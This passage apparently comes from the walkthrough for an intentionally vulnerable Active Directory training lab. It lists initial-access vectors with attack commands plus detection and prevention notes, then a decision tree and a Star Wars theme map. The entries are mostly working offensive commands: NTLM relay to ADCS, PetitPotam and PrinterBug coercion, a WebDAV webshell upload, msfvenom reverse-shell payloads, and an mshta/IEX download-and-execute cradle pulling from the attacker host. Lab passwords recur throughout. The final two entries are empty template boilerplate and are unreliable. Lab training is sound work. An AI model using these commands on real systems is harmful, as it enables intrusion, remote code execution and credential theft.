### IA-039 — IIS WebDAV PROPFIND + relay endpoint on `endor`

`Web-DAV-Publishing` + `Web-Dir-Browsing` are enabled on the ADCS web server. PROPFIND/OPTIONS responses give you OS / IIS / .NET version + paths; a writable WebDAV path can be used as the HTTP target of an NTLM relay.

```bash
curl -X OPTIONS -i http://10.10.0.12/                              # see WebDAV verbs
curl -X PROPFIND -H 'Depth: 1' http://10.10.0.12/CertSrv/ -i
davtest -url http://10.10.0.12/                                    # tries PUT/MKCOL
# Use as relay endpoint:
impacket-ntlmrelayx -t http://10.10.0.12/CertSrv/certfnsh.asp --adcs --template DomainController
```
**Detection:** IIS log PROPFIND/MKCOL verbs from non-admin sources.
**Prevention:** Remove `Web-DAV-Publishing`; restrict `CertSrv` to AD-authenticated only.

---

### IA-040 — WinRM HTTPS (5986) cert-pinning practice

Every host now also listens on `5986/tcp` with a self-signed cert. Practice the harder, real-world case where you can't just `-k` past TLS.

```bash
nmap -p5985,5986 --script ssl-cert 10.10.0.10
# Self-signed → relay/MITM angle (or just trust-on-first-use):
evil-winrm -i 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' -S
```
**Detection:** Cert-pinning telemetry in EDR; unusual 5986 source IPs.
**Prevention:** Issue WinRM certs from the enterprise CA; pin thumbprints on management hosts.

---

### IA-041 — DNS AXFR open on every DC

Every DC (not just coruscant.corp) now allows zone transfer.

```bash
for dc in 10.10.0.10 10.10.0.11 10.20.0.10 10.30.0.10; do
  for z in empire.local eu.empire.local rebel.local trade.corp; do
    dig @$dc $z AXFR +short
  done
done
```
You get every A/CNAME/SRV record in every forest — host inventory without ever authenticating.
**Detection:** DNS event 6004 (zone transfer denied/allowed) audit on DCs.
**Prevention:** `Set-DnsServerPrimaryZone -SecureSecondaries TransferToZoneNameServer` or `TransferToSecureServers`.

---

### IA-042 — Null-session pipe enumeration on all DCs (not just corp)

`RestrictAnonymous=0` + `NullSessionPipes=netlogon,samr,lsarpc,browser,srvsvc,wkssvc` is now wired on every DC (previously only corp). Anonymous SAMR / LSARPC enumeration works across the entire forest set.

```bash
for dc in 10.10.0.10 10.10.0.11 10.20.0.10 10.30.0.10; do
  echo "=== $dc ==="
  rpcclient -U '' -N $dc -c 'enumdomusers'
  impacket-lookupsid '@'$dc -no-pass 20000 | tail
  enum4linux-ng -A $dc
done
```
**Detection:** Anonymous SMB session events on DC (4624 logon type 3, account `ANONYMOUS LOGON`).
**Prevention:** `RestrictAnonymous=1`, empty `NullSessionPipes`.

---

### IA-043 — RDP NLA-off (BlueKeep practice gate) on `tatooine`

`UserAuthentication=0` on tatooine — connect without NLA, practise CVE-2019-0708 pre-auth path or just brute users without lockout that PreAuth would impose.

```bash
nmap -p3389 --script rdp-vuln-ms12-020,rdp-ntlm-info 10.10.0.100
crowbar -b rdp -s 10.10.0.100/32 -u peter.parker -C passwords.txt
xfreerdp /v:10.10.0.100 /u:peter.parker /p:'EmpireLab2024!' -sec-nla
```
**Detection:** 4625 logon type 10 on tatooine; RDP brute volume.
**Prevention:** `UserAuthentication=1` (require NLA); MFA via RDPGW.

---

### IA-044 — Print Spooler reachable everywhere (PrinterBug from any host)

Spooler is now started on every member, not just `coruscant`. A shared printer `EMPIRE-PRN` is published on `scarif`. This means PrinterBug-style coercion (MS-RPRN `RpcRemoteFindFirstPrinterChangeNotificationEx`) works against every domain-joined Windows host in the lab.

```bash
# Spool enumeration (anon-bind via lsarpc usually fine):
impacket-rpcdump '@10.10.0.13' | grep -i spoolss
# Coerce from non-DC:
impacket-printerbug 'empire.local/peter.parker:EmpireLab2024!@10.10.0.14' 10.10.0.1   # kamino coerces to your Kali
# Coerce DC$:
impacket-printerbug -no-pass '@10.10.0.10' 10.10.0.1
```
**Detection:** MS-RPRN AddPrinterDriverEx telemetry; outbound SMB/HTTP from server to non-DC IP.
**Prevention:** Disable Spooler on every server that doesn't print (most of them).

---

### IA-045 — WebClient (WebDAV client) auto-start everywhere → HTTP coercion

`WebClient` is set auto-start on every host. That means any coerced authentication can be steered to HTTP (port 80) instead of SMB, which bypasses SMB signing requirements entirely.

```bash
# Coerce → relay to ADCS over HTTP:
impacket-ntlmrelayx -t http://10.10.0.12/CertSrv/certfnsh.asp --adcs --template DomainController -smb2support &
impacket-petitpotam -u '' -p '' -d empire.local 10.10.0.1@80/test 10.10.0.10
```
**Detection:** WebClient service start events; outbound HTTP from server to non-CA IP with NTLM auth.
**Prevention:** Set WebClient to manual/disabled on servers.

---

### IA-046 — ADWS (9389) LDAP-over-HTTP enumeration on every DC

`ADWS` service auto-start is enforced on every DC. ADWS is the transport behind `Get-ADUser` etc. — useful when LDAP/389 is blocked but 9389 isn't.

```bash
nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --use-kcache  # falls back to ADWS
# Or directly via SOAPHound / PowerShell ActiveDirectory module:
Get-ADUser -Server deathstar.eu.empire.local:9389 -Filter *
```
**Detection:** Unusual 9389 source IPs in DC firewall logs.
**Prevention:** Restrict ADWS to mgmt subnets via firewall.

---

### IA-047 — WSD / SSDP / FunctionDiscovery broadcast on every host

`FDResPub`, `SSDPSRV`, `fdPHost` are running everywhere. WS-Discovery (`urn:schemas-xmlsoap-org:ws:2005:04:discovery`) sends multicast probes — passive listening on the bridge reveals hostnames + roles.

```bash
sudo tcpdump -i empire-ctf -n 'host 239.255.255.250 or port 1900 or port 3702'
nmap --script broadcast-wsdd-discover
gobuster dns -d empire.local -w /usr/share/wordlists/dnssrv.txt
```
**Detection:** Network monitoring for excessive WS-Discovery; passive IDS.
**Prevention:** Disable WS-Discovery services where not needed.

---

### IA-048 — SQL Server Browser (UDP 1434) broadcast discovery

SQLBrowser auto-start on kamino exposes instance metadata to unauthenticated UDP probes.

```bash
nmap -sU -p1434 --script ms-sql-info,broadcast-ms-sql-discover 10.10.0.14
# Lists instance name, TCP port (sometimes random), version, clustering — saves you from a full TCP scan.
```
Chains into IA-011 (sa weak password) once you know the instance.
**Detection:** Unusual UDP 1434 source IPs.
**Prevention:** Disable SQL Browser if you have only static ports; restrict to mgmt subnet.

---

### IA-049 — IIS WebDAV writable upload → ASPX webshell (endor)

If WebDAV is misconfigured to allow PUT on a `.aspx` extension (lab leaves the defaults), you go from unauth PROPFIND to RCE under `IIS APPPOOL\DefaultAppPool`.

```bash
davtest -url http://10.10.0.12/                            # probe PUT
curl -T shell.aspx http://10.10.0.12/uploads/shell.aspx    # if allowed
curl 'http://10.10.0.12/uploads/shell.aspx?cmd=whoami'
```
**Detection:** IIS PUT verb to /uploads/ from non-internal IP; w3wp.exe → cmd.exe parent-child.
**Prevention:** Strip executable extensions from WebDAV's `applicationHost.config` write rules.

---

### IA-050 — `Public/Private` SNMP write → service config push (lateral pre-auth)

`private` is RW. With write access you can poke service start types / paths and weaponise the next reboot or restart.

```bash
# Read the host's service table:
snmpwalk -v2c -c public 10.10.0.13 1.3.6.1.4.1.77.1.2.3.1
# Push registry values (e.g., change Image Path of a low-priv service):
snmpset -v2c -c private 10.10.0.13 \
    1.3.6.1.4.1.77.1.2.3.1.5.<servicePathOid> s 'C:\Windows\Temp\evil.exe'
```
**Detection:** ETW Registry-EventID 13 (SetValue) where the source was SNMP service.
**Prevention:** SNMPv3 with auth+priv; community-string RW = never.

---

## IA-052..119 — Extended Phishing, Services, and Domain Misconfigurations

### IA-052 — LNK file bait
**What it is:** a malicious shortcut (`.lnk`) file planted on a network share or public directory. When a user browses the folder containing the `.lnk` file, Windows automatically attempts to retrieve its icon. If the icon location points to a UNC path on the attacker's IP, the victim's OS will initiate an outbound SMB connection and attempt to authenticate, leaking NetNTLMv2 hashes.
**Why it works in EMPIRE:** `tatooine.empire.local` has a shortcut `Shared Resources.lnk` created under the public desktop or phishing drop path pointing to `\\10.10.0.1\share\payload.exe`. The victim executor simulator (running as a domain user) periodically resolves/clicks the shortcut.
**Tools:** `Responder`, `ntlmrelayx.py`.
**Steps:**
```bash
# Start Responder on your Kali machine to listen for incoming NTLM auth
sudo responder -I virbr1 -wd

# Wait for the victim execution script to trigger (every ~30s) and send NetNTLMv2 hashes
```
**Detection:** Sysmon Event `11` (File Create) for `.lnk` files in public or shared paths; outbound network connections on TCP port 445 (SMB) from client workstations to external/untrusted IPs.
**Prevention:** Block outbound SMB (TCP port 445) at the network gateway; enforce SMB Signing or SMB Encryption; remove write access for standard users on public/shared paths.

---

### IA-053 — AutoPlay enabled for all drives
**What it is:** AutoPlay automatically launches applications or actions when media (such as a USB drive or CD-ROM) is connected. If enabled for all drive types, inserting malicious media can trigger automatic execution of untrusted files.
**Why it works in EMPIRE:** The registry key `HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer` has `NoDriveTypeAutoRun` set to `0` on `tatooine.empire.local`, allowing AutoPlay for all drive types.
**Tools:** `reg.exe` or PowerShell for verification.
**Steps:**
```bash
# Verify NoDriveTypeAutoRun policy in the registry
nxc smb 10.10.0.100 -u 'peter.parker' -p 'EmpireLab2024!' -x 'reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun'
```
**Detection:** Registry audit events or Sysmon Events `12`/`13` showing modifications to `NoDriveTypeAutoRun`.
**Prevention:** Enforce `NoDriveTypeAutoRun` to `255` (`0xFF`) via Group Policy to disable AutoRun and AutoPlay on all drives.

---

### IA-054 — Office macro doc
**What it is:** phishing using a Microsoft Office document (`.docm` or `.xlsm`) containing malicious VBA macro code. Opening the file triggers execution of the VBA macros (typically under `AutoOpen` or `Document_Open` routines) to execute payloads or stagers.
**Why it works in EMPIRE:** The victim executor script on `tatooine` runs Office Word via COM objects to open any dropped documents, executing macro code in a Medium-integrity context.
**Tools:** `msfvenom`, Word/Excel COM objects.
**Steps:**
```bash
# 1. Generate a malicious VBA macro payload on Kali
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.1 LPORT=443 -f vba -o macro.vba

# 2. Embed the macro into a document and drop it in C:\Shares\Drop or C:\Users\Public\Documents
```
**Detection:** Sysmon Event `1` showing `winword.exe` or `excel.exe` spawning child processes (such as `cmd.exe`, `powershell.exe`, or `mshta.exe`).
**Prevention:** Enforce Group Policy to disable all macros in Office files downloaded from the Internet; enable ASR rules blocking Office applications from spawning child processes.

---

### IA-056 — HTA payload stub
**What it is:** HTML Applications (`.hta`) are executable files that run via `mshta.exe`. They bypass standard browser sandboxing and run in a full-trust environment, executing JScript or VBScript.
**Why it works in EMPIRE:** An HTA stub `Invoice_2024.hta` is placed in `C:\Users\Administrator\Downloads` on `tatooine`. The victim executor periodically double-clicks and runs HTAs using `mshta.exe`.
**Tools:** `mshta.exe`, `msfvenom`.
**Steps:**
```bash
# 1. Generate an HTA reverse shell payload on Kali
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.1 LPORT=443 -f hta-psh -o evil.hta

# 2. Host the HTA or execute it on the target workstation
mshta.exe http://10.10.0.1:8080/evil.hta
```
**Detection:** Sysmon Event `1` where `mshta.exe` is executed with command-line arguments pointing to UNC or HTTP paths; Sysmon Event `3` showing network connections from `mshta.exe`.
**Prevention:** Disable or block `mshta.exe` using WDAC or AppLocker; change default file associations for `.hta` to notepad.

---

### IA-063 — Compiled HTML Help (.chm) with ActiveX Execution
**What it is:** Compiled HTML Help (`.chm`) files are handled by `hh.exe`. They can contain ActiveX shortcut controls that execute arbitrary commands when the help file is opened.
**Why it works in EMPIRE:** A technical note `FLAG-IA-063-CHM-ActiveX.txt` is dropped on `tatooine` in `C:\Flags` to illustrate the vector. The victim executor will launch `.chm` files when opened by `hh.exe`.
**Tools:** `hh.exe`, `Out-CHM` (Nishang), HTML Help Workshop.
**Steps:**
```bash
# Compile a .chm containing ActiveX object that runs:
# cmd.exe /c powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.0.1/payload')

# Open the compiled .chm help file to trigger execution:
hh.exe C:\Flags\FLAG-IA-063-CHM-ActiveX.txt
```
**Detection:** Sysmon Event `1` showing `hh.exe` spawning command processors (`cmd.exe`, `powershell.exe`); network connections initiated by `hh.exe`.
**Prevention:** Block `.chm` email attachments; restrict or disable `hh.exe` using AppLocker/WDAC.

---

### IA-076 — IIS directory browsing enabled
**What it is:** directory browsing in IIS lets unauthenticated users view the complete file structure of a web directory when a default document (like `index.html`) is missing.
**Why it works in EMPIRE:** Directory browsing is set to `$true` globally on `scarif.empire.local` (`10.10.0.13`).
**Tools:** `curl`, web browser.
**Steps:**
```bash
# Perform an HTTP request on the root directory
curl -s http://10.10.0.13/
# Inspect response for directories and files exposed in the webroot
```
**Detection:** IIS logs showing `GET` requests returning HTTP `200` response codes for folders ending in `/`.
**Prevention:** Disable directory browsing using IIS Manager or via PowerShell:
```powershell
Set-WebConfigurationProperty /system.webServer/directoryBrowse -Name enabled -Value False -PSPath 'MACHINE/WEBROOT/APPHOST'
```

---

### IA-078 — WebDAV authoring enabled
**What it is:** WebDAV authoring allows clients to perform file-management operations (like upload, move, delete) over HTTP. If configured without authentication or with write permissions, unauthenticated users can upload web shells or payloads.
**Why it works in EMPIRE:** WebDAV authoring is enabled on `scarif.empire.local` (`10.10.0.13`).
**Tools:** `davtest`, `curl`.
**Steps:**
```bash
# 1. Verify WebDAV verbs allowed on the server
curl -X OPTIONS -i http://10.10.0.13/

# 2. Upload a web shell or file using the PUT verb
curl -X PUT -T shell.txt http://10.10.0.13/uploads/shell.txt
```
**Detection:** IIS log entries with WebDAV verbs (`PROPFIND`, `PUT`, `MOVE`, `DELETE`) from unauthorized IP addresses.
**Prevention:** Disable WebDAV publishing if unnecessary, or restrict access using strict IIS Authorization rules.

---

### IA-084 — RDP NLA disabled (pre-auth attack surface)
**What it is:** Network Level Authentication (NLA) forces authentication before establishing a full RDP connection. When NLA is disabled, the RDP server establishes a session and exposes the Windows login screen, presenting a pre-authentication attack surface.
**Why it works in EMPIRE:** `UserAuthentication` is set to `0` under the RDP-Tcp registry path on `scarif.empire.local` (`10.10.0.13`).
**Tools:** `xfreerdp`, `nmap`.
**Steps:**
```bash
# Connect to RDP without enforcing Network Level Authentication (sec-nla)
xfreerdp /v:10.10.0.13 /u:peter.parker /p:'EmpireLab2024!' -sec-nla
```
**Detection:** Security Event `4624`/`4625` (Logon Type `10`) without NLA validation; network security scans pointing out missing NLA.
**Prevention:** Enforce NLA by setting `UserAuthentication` to `1` under `HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp`.

---

### IA-085 — OpenSSH server with password authentication
**What it is:** running an OpenSSH server with password-based authentication enabled allows remote shell authentication, exposing the system to brute-force and credential spraying.
**Why it works in EMPIRE:** OpenSSH Server is active on `scarif.empire.local` (`10.10.0.13`) with `PasswordAuthentication` set to `yes` in `sshd_config`.
**Tools:** `ssh`, `hydra`, `nxc ssh`.
**Steps:**
```bash
# Perform a password spray or brute-force against OpenSSH
hydra -L users.txt -P passwords.txt ssh://10.10.0.13 -t 4
```
**Detection:** Multiples of failed login events from `sshd.exe` (Event `4625` with Logon Type `3` or `8`); high connection rates on TCP port 22 in network firewall logs.
**Prevention:** Set `PasswordAuthentication no` in `sshd_config` and enforce public-key authentication (`PubkeyAuthentication yes`).

---

### IA-113 — Weak default domain password policy
**What it is:** setting weak constraints (like no complexity, short passwords, no lockout threshold) in the default domain password policy. This makes the domain vulnerable to password spraying and offline brute-forcing.
**Why it works in EMPIRE:** The default domain password policy on `coruscant.empire.local` has `ComplexityEnabled` set to `$false`, `MinPasswordLength` set to `1`, and `LockoutThreshold` set to `0`.
**Tools:** `nxc smb`, `enum4linux-ng`, `Get-ADDefaultDomainPasswordPolicy`.
**Steps:**
```bash
# Query default domain password policy anonymously or using low-priv credentials
nxc smb 10.10.0.10 -u 'Guest' -p '' --pass-pol
```
**Detection:** Security Event `4739` (Domain Policy Changed); AD auditing tools flagging weak policy settings.
**Prevention:** Enforce a strong password policy (e.g., minimum length 14, complexity enabled, lockout threshold of 5 to 10 attempts).

---

### IA-114 — Weak-PSO fine-grained policy for service accounts
**What it is:** Password Settings Objects (PSOs) define password policies for specific users or groups. Setting a weak PSO on service accounts exposes those accounts to offline cracking and password guessing.
**Why it works in EMPIRE:** A custom PSO named `Weak-PSO` (with no complexity requirements and a minimum length of 1) is created and applied to service accounts in `empire.local`.
**Tools:** `Get-ADFineGrainedPasswordPolicy`.
**Steps:**
```powershell
# Enumerate all Fine-Grained Password Policies in the domain
Get-ADFineGrainedPasswordPolicy -Filter *
```
**Detection:** Audits of Active Directory configurations; Event `5136` (Directory Service Object Modified) showing PSO creations/changes.
**Prevention:** Delete weak PSOs or apply strong, complex password requirements to all service account PSOs.

---

### IA-115 — AdminCount=1 on non-admin accounts (SDProp bypass)
**What it is:** setting `adminCount=1` on accounts that are not actually in protected administrative groups. This causes the SDProp process to overwrite the account's permissions with the protected AdminSDHolder template, disabling ACL inheritance.
**Why it works in EMPIRE:** The accounts `svc_c3po` and `jim.halpert` in `empire.local` are manually configured with `adminCount=1`.
**Tools:** `Get-ADUser`, `ldapsearch`.
**Steps:**
```bash
# Query user objects in Active Directory to find those with adminCount=1
ldapsearch -x -H ldap://10.10.0.10 -D "peter.parker@empire.local" -w "EmpireLab2024!" -b "DC=empire,DC=local" "(&(objectClass=user)(adminCount=1))" sAMAccountName
```
**Detection:** Discrepancy between group membership (not in Domain Admins, etc.) and `adminCount` attribute status.
**Prevention:** Clear the `adminCount` attribute on non-administrative accounts and re-enable permission inheritance on those objects.

---

### IA-117 — MachineAccountQuota = 100
**What it is:** the `ms-DS-MachineAccountQuota` attribute determines how many computer accounts standard domain users can add to the domain. High quota limits enable attackers to create computer accounts for RBCD or sAMAccountName spoofing attacks.
**Why it works in EMPIRE:** The domain-wide quota is set to `100` in `empire.local`.
**Tools:** `impacket-addcomputer`, `powerview`.
**Steps:**
```bash
# Add a computer account from Kali using low-privilege domain credentials
impacket-addcomputer -dc-ip 10.10.0.10 -computer-name 'ROBOT-PC$' -computer-pass 'RoboPass123!' 'empire.local/peter.parker:EmpireLab2024!'
```
**Detection:** Event `4741` (A computer account was created) where the CreatorSID corresponds to a non-administrative user.
**Prevention:** Set the `ms-DS-MachineAccountQuota` attribute to `0` on the domain object to prevent non-admin users from joining arbitrary computers.

---

### IA-119 — Plaintext credential planted in a GPO registry value
**What it is:** storing plaintext passwords or sensitive credentials in Group Policy Objects (GPOs) such as registry values, XML preference files, or script templates. All authenticated domain users can read the SYSVOL share, allowing them to search for and extract these credentials.
**Why it works in EMPIRE:** Plaintext credentials for `svc_darryl` (`Darryl2024!`) are written to the `Default Domain Policy` GPO under the registry key `HKLM\Software\DVADLab\setup_password` on `coruscant.empire.local`.
**Tools:** `gposearch`, `netexec`, `Get-GPOReport`.
**Steps:**
```bash
# Search GPO files in the SYSVOL directory for password patterns
grep -ri "password" /var/lib/samba/sysvol/
```
**Detection:** Auditing and file monitoring inside `\\domain\SYSVOL` for files containing passwords; Event `5136` or `5141` for GPO modifications.
**Prevention:** Do not store plaintext passwords in GPOs, registry values, or files. Enforce policies to remove existing GPP passwords (KB2962486) and migrate to gMSAs or LAPS.

---

## Initial-Access decision tree (read before you start)

```
You are on Kali at 10.10.0.1 with no creds.
│
├── Need a domain user? Try pre-auth Kerberos:
│       IA-005 userenum  → IA-006 spray  → AS-REP roast (CRED-002 / ENUM-027)
│
├── Want a SYSTEM-ish foothold WITHOUT a user? Try coerce+relay:
│       IA-008 Responder  + ntlmrelayx -> SMB without signing
│       IA-009 mitm6      + ntlmrelayx -> LDAPS write
│       IA-013 PetitPotam + ntlmrelayx -> ADCS ESC8 -> DC$ TGT
│       IA-015 ZeroLogon  (if unpatched)
│
├── Are there exposed services?
│       IA-007 Guest account enabled on scarif
│       IA-011 MSSQL sa  weak  password
│       IA-017 EternalBlue / SMBGhost
│       IA-018 Exchange ProxyShell
│       IA-025 VPN/SSL-VPN CVE
│       IA-026 web app / Log4Shell
│       IA-034 SNMP public/private read+write
│       IA-035 anon FTP on scarif
│       IA-036 Telnet brute on scarif
│       IA-037 anon NFS rw on scarif
│       IA-038 SMB1 / EternalBlue on scarif
│       IA-039 IIS WebDAV PROPFIND/relay on endor
│       IA-040 WinRM HTTPS (5986) self-signed
│       IA-041 DNS AXFR on every DC
│       IA-042 null-session pipes on every DC
│       IA-043 RDP NLA-off on tatooine
│       IA-044 PrinterBug from any member
│       IA-045 WebClient HTTP coercion path
│       IA-046 ADWS (9389) enum
│       IA-047 WSD/SSDP passive sniff
│       IA-048 SQL Browser broadcast
│       IA-049 WebDAV PUT → ASPX
│       IA-050 SNMP RW → service-path hijack
│       IA-076 IIS directory browsing enabled
│       IA-078 WebDAV authoring enabled
│       IA-084 RDP NLA-off on scarif
│       IA-085 OpenSSH with password authentication
│
├── Can you reach users?
│       IA-019 macro phish
│       IA-020 LNK on share
│       IA-021 OAuth / evilginx
│       IA-022 HTA
│       IA-023 ISO MOTW bypass
│       IA-024 library-ms
│       IA-027 RDP brute
│       IA-028 USB drop
│       IA-032 device-code
│       IA-052 LNK file bait
│       IA-053 AutoPlay enabled
│       IA-054 Office macro doc
│       IA-056 HTA payload stub
│       IA-063 Compiled HTML Help (.chm)
│
├── Physical / network position?
│       IA-029 SCCM PXE
│       IA-030 VLAN hop
│
├── Domain Misconfigurations (visible/abusable):
│       IA-113 Weak default domain password policy
│       IA-114 Weak-PSO Fine-Grained Policy
│       IA-115 AdminCount=1 on non-admins
│       IA-117 MachineAccountQuota = 100
│       IA-119 Plaintext credential planted in GPO
│
└── Got a foothold?  →  stand up C2 (IA-033)  →  jump to docs/03-credential-access.md
```

---

## Why these vectors weren't in the previous walkthrough

The original docs assumed you were `corp\peter.parker` with a password — they started at recon-as-domain-user. That's a reasonable assumption for the lab's published flag matrix (REC/CRED/LAT/PE/PER/DF), but it skips the most realistic and most teachable part of a real engagement: *how you got the first foothold*. This page closes that gap. From here, the existing docs take over:

- IA-006 / CRED-002 (AS-REP roast) → you have a password → [`02-recon.md`](02-recon.md)
- IA-013 → you have DC$ cert / TGT → [`07-forest-compromise.md`](07-forest-compromise.md) (DF-011 ESC8 chain)
- IA-009 / IA-008 relay → you have RBCD / Domain User → [`03-credential-access.md`](03-credential-access.md)
- IA-019..028 → you have a code-exec on `tatooine` → [`05-privilege-escalation.md`](05-privilege-escalation.md) (PE family)

---

Next: [`03-credential-access.md`](03-credential-access.md).

---

# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping

Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.

## The Galactic Topology

The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.

```mermaid
graph TD
    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;

    subgraph The Galactic Empire (empire.local)
        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
        Coruscant -- "Imperial Command" --> DeathStar
        Coruscant --- Scarif
        Coruscant --- Kamino
        Coruscant --- Endor
        Coruscant --- Mandalore
    end

    subgraph The Rebel Alliance (rebel.local)
        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
    end

    subgraph The Trade Federation (trade.corp)
        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
    end

    Coruscant <-->|Espionage / External Trust| Yavin4
    Coruscant <-->|Treaty / Forest Trust| Neimoidia
```

## Infrastructure Mapping

Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:

### 1. The Core Domains
* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.

### 2. High-Value Targets (Servers)
* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.

### 3. Attack Paths and Tactics
* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.

## The Hacker's Code (Sith vs Jedi)
As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?

* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).

## Flag Locations (Holocrons)
Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 

**Remember:** 
* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.

May the Force be with you as you conquer the EMPIRE AD!


## Additional Vulnerabilities
### IA-083
**Explanation:** This vulnerability (IA-083) involves exploiting specific misconfigurations or CVEs to achieve the objective.

**Commands:**
```bash
python3 exploit_ia-083.py --target target_ip
```

### IA-087
**Explanation:** This vulnerability (IA-087) involves exploiting specific misconfigurations or CVEs to achieve the objective.

**Commands:**
```bash
python3 exploit_ia-087.py --target target_ip
```

